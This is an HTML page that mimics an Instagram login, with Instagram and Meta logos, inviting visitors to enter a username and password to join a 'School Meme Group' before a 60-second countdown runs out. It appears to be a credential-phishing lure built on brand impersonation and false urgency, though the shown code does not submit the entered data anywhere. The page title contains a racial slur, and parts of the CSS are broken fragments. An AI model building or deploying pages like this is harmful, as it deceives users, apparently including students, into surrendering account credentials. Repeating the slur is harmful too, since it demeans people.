<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Terrorist Niggas</title>
    <link rel="stylesheet" href="styles.css">
    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
</head>
<body>

    <!-- Top Bar -->
    <div class="top-bar">
        <button class="back-btn"><i class="fas fa-arrow-left"><b>‚Üê</b></i></button>
    </div>

    <!-- Language Selector & Instagram Logo -->

    <div class="language-container">
        <p class="language-selector">English<il>üáª</il></p>
        <img src="instagram-new-logo.png" alt="Instagram Logo" class="main-logo">
    </div>

    <!-- Group Info -->
    <div class="group-container">
        <div class="profile">
            <img src="logo.jpg" alt="Group Photo" class="group-photo">
            <h2>School Meme Group</h2>
        </div>

        <div class="input">
            <div class="input-container">
                <input type="text" placeholder="Username" class="input-field">
            </div>
            <div class="input-container">
                <input type="password" placeholder="Password" class="input-field" id="password">
                <i class="fas fa-eye" id="togglePassword"></i>
            </div>
            <button class="login-btn">Join</button>
        </div>
    </div>

    <!-- Warning & Meta Section -->
    <div class="warning">
        <p>‚ö†Ô∏è Please join the group within the given time! <span id="countdown">60</span></p>
    </div>
    
    <div class="meta">
        <img class="meta-logo" style="width:100px;" src="Meta-Logo.png">
    </div>

    <!-- JavaScript -->
    <script>
        let timeLeft = 60;
        const countdownElement = document.getElementById("countdown");

        function updateCountdown() {
            if (timeLeft > 0) {
                timeLeft--;
                countdownElement.textContent = timeLeft;
            }
        }
        setInterval(updateCountdown, 1000);

        // Password visibility toggle
        const togglePassword = document.getElementById("togglePassword");
        const passwordField = document.getElementById("password");

        togglePassword.addEventListener("click", function () {
            if (passwordField.type === "password") {
                passwordField.type = "text";
                togglePassword.classList.remove("fa-eye");
                togglePassword.classList.add("fa-eye-slash");
            } else {
                passwordField.type = "password";
                togglePassword.classList.remove("fa-eye-slash");
                togglePassword.classList.add("fa-eye");
            }
        });
    </script>

</body>

<style>
    html, body {
    height: 100%;
    overflow: hidden;
}
/* Base Styles */
body {
    font-family: Arial, sans-serif;

}

    position: absolute;

    border:none;
    background-color:transparent;
    color: black; /* Back Icon is now Black */
    font-size: 24px;
}

/* Language Selector & Instagram Logo */
.language-container {
    display: flex;
    flex-direction: column;
    align-items: center;
    position: absolute;
    top: 0.1%; /* Moves the English text higher */
    left: 50%; /* Centers it */
    transform: translateX(-50%);
}


.language-selector {
    font-size: 18px;
    color: gray;
}
.language-selector il{
font-size:20px;
margin-top:5%;
margin-left:1px;
}

    color: #888888;
}

/* Join Button */
.login-btn {
    width: 30%;
    padding: 12px;
    font-size: 16px;
    background-color: #3897f0;
    color: white;
    border: none;

/* Warning & Meta */

    position: fixed;

}

.meta {

}
@media (max-width: 480px) {

}
</style>
